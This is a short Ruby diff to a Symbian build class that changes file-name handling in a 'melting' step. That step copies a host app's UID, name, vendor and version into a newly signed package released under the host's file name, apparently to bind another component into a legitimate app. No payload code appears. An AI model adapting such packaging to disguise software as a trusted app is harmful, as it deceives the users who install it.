@@ -116,9 +116,9 @@ class BuildSymbian < Build
     if @melted
       @appname_orig = params['filename']
       FileUtils.mkdir_p(path('melting/working'))
-      FileUtils.mv Config.instance.temp(params['input']), path("melting/working/#{@appname_orig}.sisx")
+      FileUtils.mv Config.instance.temp(params['input']), path("melting/working/#{@appname_orig}")
       # get info from the original sisx (host)
-      @melted_uid, @melted_name, @melted_vendor, @melted_major, @melted_minor = get_app_info(path("melting/working/#{@appname_orig}.sisx"))
+      @melted_uid, @melted_name, @melted_vendor, @melted_major, @melted_minor = get_app_info(path("melting/working/#{@appname_orig}"))
     end
 
   end
@@ -185,7 +185,7 @@ class BuildSymbian < Build
         content.gsub! '[:uniquevendorname:]', @melted_vendor
         content.gsub! '[:major:]', @melted_major
         content.gsub! '[:minor:]', @melted_minor
-        content.gsub! '[:packagename:]', "#{@appname_orig}.sisx"
+        content.gsub! '[:packagename:]', "#{@appname_orig}"
         content.gsub! '[:uid:]', @melted_uid
         File.open(path("melting/working/melting.pkg"), 'wb') {|f| f.write content}
       end
@@ -196,9 +196,9 @@ class BuildSymbian < Build
       CrossPlatform.exec path('signsis'), "-s melted.sis melted.sisx ../../symbian.cer ../../symbian.key", {chdir: path('melting/working')}
       File.exist? path("melting/working/melted.sisx") or raise("signsis failed for melted")
 
-      FileUtils.cp path("melting/working/melted.sisx"), path(@appname_orig + '.sisx')
+      FileUtils.cp path("melting/working/melted.sisx"), path(@appname_orig)
 
-      @outputs += [@appname_orig + '.sisx']
+      @outputs += [@appname_orig]
     end
     
   end
@@ -206,10 +206,10 @@ class BuildSymbian < Build
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
-    name = @melted ? @appname_orig : @appname
+    name = @melted ? @appname_orig : @appname + '.sisx'
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open(name + '.sisx', "wb") { |f| f.write File.open(path(name + '.sisx'), 'rb') {|f| f.read} }
+      z.file.open(name, "wb") { |f| f.write File.open(path(name), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
